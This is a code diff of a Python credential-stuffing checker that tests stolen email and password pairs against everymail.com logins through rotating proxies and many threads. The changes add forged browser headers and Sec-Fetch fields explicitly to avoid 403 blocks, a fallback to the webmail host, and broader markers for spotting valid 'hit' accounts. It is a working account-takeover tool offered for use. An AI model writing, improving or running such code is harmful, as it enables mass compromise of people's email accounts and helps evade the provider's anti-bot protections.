@@ -8,7 +8,6 @@ import shutil
 from queue import Queue
 from colorama import init, Fore, Style
 from user_agent import generate_user_agent
-from urllib.parse import urlparse
 
 warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
@@ -17,12 +16,9 @@ init(autoreset=True)
 UA_CONFIGS = [
     {'os': 'win', 'navigator': 'chrome'},
     {'os': 'win', 'navigator': 'firefox'},
-    {'os': 'win', 'navigator': 'ie'},
     {'os': 'mac', 'navigator': 'chrome'},
-    {'os': 'mac', 'navigator': 'firefox'},
+    {'os': 'mac', 'navigator': 'safari'},
     {'os': 'linux', 'navigator': 'chrome'},
-    {'os': 'linux', 'navigator': 'firefox'},
-    {'os': 'android', 'navigator': 'chrome'},
 ]
 
 def get_random_user_agent():
@@ -30,7 +26,7 @@ def get_random_user_agent():
         config = random.choice(UA_CONFIGS)
         return generate_user_agent(os=config['os'], navigator=config['navigator'])
     except:
-        return generate_user_agent()
+        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
 
 try:
     import socks
@@ -131,11 +127,6 @@ if not proxies:
     else:
         input(f"\n{Fore.RED}proxy.txt is REQUIRED for full checking! Press Enter to exit...")
         exit()
-else:
-    if not SOCKS_AVAILABLE:
-        has_socks = any(p.startswith(('socks4://', 'socks5://', 'socks5h://')) for p in proxies)
-        if has_socks:
-            print(f"{Fore.YELLOW}[!] Warning: SOCKS proxies detected but 'requests[socks]' not installed.\n")
 
 if use_proxies:
     threads_input = input(f"{Fore.CYAN}Threads (1-50, default 10): {Style.RESET_ALL}").strip()
@@ -156,23 +147,46 @@ print_lock = threading.Lock()
 result_counter = 0
 
 def check_account(email, pwd, proxy_dict):
+    """Check Everymail account - FIX: Better anti-bot headers and multiple endpoints"""
     s = requests.Session()
     userA = get_random_user_agent()
     
     try:
+        # Better browser-like headers to avoid 403
         headers = {
             "User-Agent": userA,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.9",
             "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+            "Sec-Fetch-Dest": "document",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "none",
+            "Sec-Fetch-User": "?1",
+            "Cache-Control": "max-age=0",
+            "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": '"Windows"',
         }
         
-        r1 = s.get("https://everymail.com/login", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
+        # First get the main page
+        r1 = s.get("https://everymail.com/", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
         
-        headers["Content-Type"] = "application/x-www-form-urlencoded"
-        headers["Origin"] = "https://everymail.com"
-        headers["Referer"] = "https://everymail.com/login"
+        # If blocked, try alternate approach
+        if r1.status_code == 403:
+            # Try webmail direct access
+            r1 = s.get("https://webmail.everymail.com/", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
         
+        # Update headers for login
+        headers.update({
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": "https://everymail.com",
+            "Referer": "https://everymail.com/login",
+            "Sec-Fetch-Site": "same-origin",
+        })
+        
+        # Try login
         r = s.post("https://everymail.com/login",
                    data={"email": email, "password": pwd, "remember": "1"},
                    headers=headers, proxies=proxy_dict, timeout=25, verify=False, allow_redirects=True)
@@ -180,17 +194,34 @@ def check_account(email, pwd, proxy_dict):
         txt = r.text.lower()
         url = r.url.lower()
         
-        if any(x in url for x in ["inbox", "dashboard", "mail", "webmail"]) or any(x in txt for x in ["inbox", "compose", "logout"]):
+        # Check for successful login indicators
+        if any(x in url for x in ["inbox", "dashboard", "mail", "webmail", "messages"]):
             return "hit", "Valid"
-        elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error", "forbidden"]):
+        if any(x in txt for x in ["inbox", "compose", "sent", "logout", "new message"]):
+            return "hit", "Valid"
+        
+        # Check for failure indicators  
+        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error", "forbidden", "failed"]):
             return "fail", "Invalid credentials"
+        
+        # Check if still on login page (failed)
+        if "login" in url and ("email" in txt or "password" in txt):
+            return "fail", "Login failed"
+            
+        # Status code checks
+        if r.status_code == 403:
+            return "fail", "Site blocked (403)"
+        if r.status_code == 401:
+            return "fail", "Unauthorized"
+            
         return "fail", f"Status {r.status_code}"
+        
     except requests.exceptions.Timeout:
         return "error", "Timeout"
     except requests.exceptions.ProxyError:
         return "error", "Proxy error"
-    except:
-        return "error", "Request failed"
+    except Exception as e:
+        return "error", f"Error: {str(e)[:30]}"
 
 def worker(q):
     global result_counter, hit_counter, fail_counter
